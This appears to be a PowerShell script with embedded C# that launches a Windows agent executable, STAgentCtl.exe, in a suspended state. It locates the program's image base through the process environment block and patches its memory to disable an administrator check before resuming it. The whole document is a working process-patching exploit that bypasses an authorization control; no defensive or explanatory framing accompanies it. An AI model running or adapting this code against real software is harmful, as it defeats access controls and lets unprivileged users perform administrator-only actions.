Add-Type @"
using System;
using System.Runtime.InteropServices;
using System.Text;
using System.IO;

public class PatchLauncher
{
    [DllImport("kernel32.dll", SetLastError=true, CharSet=CharSet.Unicode)]
    static extern bool CreateProcess(string app, string cmd, IntPtr pa, IntPtr ta,
        bool inh, uint flags, IntPtr env, string dir, ref STARTUPINFO si, out PROCESS_INFORMATION pi);

    [DllImport("kernel32.dll", SetLastError=true)]
    static extern bool ReadProcessMemory(IntPtr hp, IntPtr addr, byte[] buf, int sz, out int read);

    [DllImport("kernel32.dll", SetLastError=true)]
    static extern bool WriteProcessMemory(IntPtr hp, IntPtr addr, byte[] buf, int sz, out int wrote);

    [DllImport("ntdll.dll", SetLastError=true)]
    static extern int NtQueryInformationProcess(IntPtr hp, int cls, byte[] buf, int sz, out int retLen);

    [DllImport("kernel32.dll", SetLastError=true)]
    static extern uint ResumeThread(IntPtr ht);

    [DllImport("kernel32.dll", SetLastError=true)]
    static extern bool CloseHandle(IntPtr h);

    [DllImport("kernel32.dll", SetLastError=true)]
    static extern uint WaitForSingleObject(IntPtr h, uint ms);

    [DllImport("kernel32.dll", SetLastError=true)]
    static extern IntPtr CreateFile(string name, uint access, uint share, IntPtr sec, uint disp, uint flags, IntPtr tmpl);

    [DllImport("kernel32.dll", SetLastError=true)]
    static extern bool SetHandleInformation(IntPtr h, uint mask, uint flags);

    [DllImport("kernel32.dll", SetLastError=true)]
    static extern bool ReadFile(IntPtr h, byte[] buf, int toRead, out int read, IntPtr ov);

    [DllImport("kernel32.dll", SetLastError=true)]
    static extern int GetFileSize(IntPtr h, out int high);

    [DllImport("kernel32.dll", SetLastError=true)]
    static extern bool SetFilePointer(IntPtr h, int dist, out int newPtr, uint method);

    const uint GENERIC_WRITE = 0x40000000;
    const uint GENERIC_READ = 0x80000000;
    const uint FILE_SHARE_READ = 1;
    const uint FILE_SHARE_WRITE = 2;
    const uint CREATE_ALWAYS = 2;
    const uint OPEN_EXISTING = 3;
    const uint FILE_ATTRIBUTE_NORMAL = 0x80;
    const uint HANDLE_FLAG_INHERIT = 1;

    [StructLayout(LayoutKind.Sequential)]
    struct STARTUPINFO
    {
        public int cb;
        public string reserved, desktop, title;
        public int x, y, xsz, ysz, xcnt, ycnt, fill, flags;
        public short show, reserved2;
        public IntPtr reserved2p, stdin, stdout, stderr;
    }

    [StructLayout(LayoutKind.Sequential)]
    struct PROCESS_INFORMATION
    {
        public IntPtr hProcess, hThread;
        public int pid, tid;
    }

    public static int Launch(string exe, string args, out string output)
    {
        output = "";
        string tmpOut = Path.GetTempFileName() + ".out";
        string tmpErr = Path.GetTempFileName() + ".err";

        // Create output files with inheritable handles
        IntPtr hOut = CreateFile(tmpOut, GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE,
            IntPtr.Zero, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, IntPtr.Zero);
        if (hOut == (IntPtr)(-1)) return Marshal.GetLastWin32Error();
        SetHandleInformation(hOut, HANDLE_FLAG_INHERIT, HANDLE_FLAG_INHERIT);

        IntPtr hErr = CreateFile(tmpErr, GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE,
            IntPtr.Zero, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, IntPtr.Zero);
        if (hErr == (IntPtr)(-1)) return Marshal.GetLastWin32Error();
        SetHandleInformation(hErr, HANDLE_FLAG_INHERIT, HANDLE_FLAG_INHERIT);

        STARTUPINFO si = new STARTUPINFO();
        si.cb = Marshal.SizeOf(typeof(STARTUPINFO));
        si.flags = 0x100; // STARTF_USESTDHANDLES
        si.stdout = hOut;
        si.stderr = hErr;

        PROCESS_INFORMATION pi;
        if (!CreateProcess(exe, "\"" + exe + "\" " + args,
            IntPtr.Zero, IntPtr.Zero, true, 4, // CREATE_SUSPENDED
            IntPtr.Zero, null, ref si, out pi))
        {
            CloseHandle(hOut);
            CloseHandle(hErr);
            return Marshal.GetLastWin32Error();
        }

        CloseHandle(hOut);
        CloseHandle(hErr);

        // Read PEB for ImageBaseAddress
        byte[] pbi = new byte[48];
        int retLen;
        int st = NtQueryInformationProcess(pi.hProcess, 0, pbi, 48, out retLen);
        IntPtr pebAddr = (IntPtr)BitConverter.ToInt64(pbi, 8);

        byte[] peb = new byte[32];
        int read;
        ReadProcessMemory(pi.hProcess, pebAddr, peb, 32, out read);
        long imgBase = BitConverter.ToInt64(peb, 0x10);

        int wrote;

        // Patch 1: bypass IsUserAdministrator check in dispatcher
        // At RVA 0x1D614: "je 0x1DD20" (0F 84 06 07 00 00) -> NOP 6 bytes
        IntPtr pAdminCheck = (IntPtr)(imgBase + 0x1D614);
        WriteProcessMemory(pi.hProcess, pAdminCheck, new byte[] {0x90,0x90,0x90,0x90,0x90,0x90}, 6, out wrote);

        // Patch 2: early return from handler as belt-and-suspenders
        IntPtr pHandler = (IntPtr)(imgBase + 0x1DCF4);
        WriteProcessMemory(pi.hProcess, pHandler, new byte[] {0xB8,0x01,0x00,0x00,0x00,0xC3,0x90}, 7, out wrote);

        ResumeThread(pi.hThread);
        WaitForSingleObject(pi.hProcess, 15000);

        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);

        // Read output from files
        IntPtr hOutR = CreateFile(tmpOut, GENERIC_READ, FILE_SHARE_READ,
            IntPtr.Zero, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, IntPtr.Zero);
        int szDummy, sz = GetFileSize(hOutR, out szDummy);
        byte[] buf = new byte[sz > 0 ? sz : 1];
        ReadFile(hOutR, buf, buf.Length, out read, IntPtr.Zero);
        CloseHandle(hOutR);
        string stdout = Encoding.UTF8.GetString(buf, 0, read);

        IntPtr hErrR = CreateFile(tmpErr, GENERIC_READ, FILE_SHARE_READ,
            IntPtr.Zero, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, IntPtr.Zero);
        sz = GetFileSize(hErrR, out szDummy);
        buf = new byte[sz > 0 ? sz : 1];
        ReadFile(hErrR, buf, buf.Length, out read, IntPtr.Zero);
        CloseHandle(hErrR);
        string stderr = Encoding.UTF8.GetString(buf, 0, read);

        try { File.Delete(tmpOut); } catch {}
        try { File.Delete(tmpErr); } catch {}

        output = stdout;
        if (stderr.Length > 0) output += "[E]" + stderr;
        return 0;
    }
}
"@

$out = ""
$ec = [PatchLauncher]::Launch("C:\Windows\Tasks\STAgentCtl.exe", "status", [ref]$out)
Write-Output "Exit: $ec"
Write-Output "=== OUTPUT ==="
Write-Output $out
